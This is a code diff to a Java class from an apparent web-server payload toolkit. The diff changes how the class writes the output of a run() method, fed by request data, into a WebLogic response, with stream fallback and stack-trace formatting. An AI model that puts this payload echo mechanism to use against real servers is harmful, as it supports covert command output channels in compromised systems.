@@ -1,5 +1,8 @@
 package com.reajason.javaweb.probe.payload.response;
 
+import java.io.ByteArrayOutputStream;
+import java.io.OutputStream;
+import java.io.PrintStream;
 import java.io.PrintWriter;
 import java.lang.reflect.Field;
 import java.lang.reflect.Method;
@@ -38,16 +41,27 @@ public class WebLogicWriter {
             }
             String data = getDataFromReq(request);
             if (data != null && !data.isEmpty()) {
-                PrintWriter writer = (PrintWriter) invokeMethod(response, "getWriter", null, null);
+                String result = "";
                 try {
-                    writer.write(run(data));
+                    result = run(data);
                 } catch (Throwable e) {
-                    e.printStackTrace(writer);
+                    result = getErrorMessage(e);
                 }
-                writer.flush();
-                writer.close();
+                if (result != null) {
+                    try {
+                        OutputStream outputStream = (OutputStream) invokeMethod(response, "getOutputStream", null, null);
+                        outputStream.write(result.getBytes());
+                        outputStream.flush();
+                        outputStream.close();
+                    } catch (Throwable e) {
+                        PrintWriter writer = (PrintWriter) invokeMethod(response, "getWriter", null, null);
+                        writer.write(result);
+                        writer.flush();
+                        writer.close();
+                    }
+                }
                 // 防止重复写响应，提前触发 send 操作
-                invokeMethod(response, "send", null, null);
+//                invokeMethod(response, "send", null, null);
             }
         } catch (Throwable e) {
             e.printStackTrace();
@@ -100,5 +114,20 @@ public class WebLogicWriter {
             }
         }
         throw new NoSuchFieldException(obj.getClass().getName() + " Field not found: " + name);
+    }
+
+    @SuppressWarnings("all")
+    private String getErrorMessage(Throwable throwable) {
+        PrintStream printStream = null;
+        try {
+            ByteArrayOutputStream outputStream = new ByteArrayOutputStream();
+            printStream = new PrintStream(outputStream);
+            throwable.printStackTrace(printStream);
+            return outputStream.toString();
+        } finally {
+            if (printStream != null) {
+                printStream.close();
+            }
+        }
     }
 }
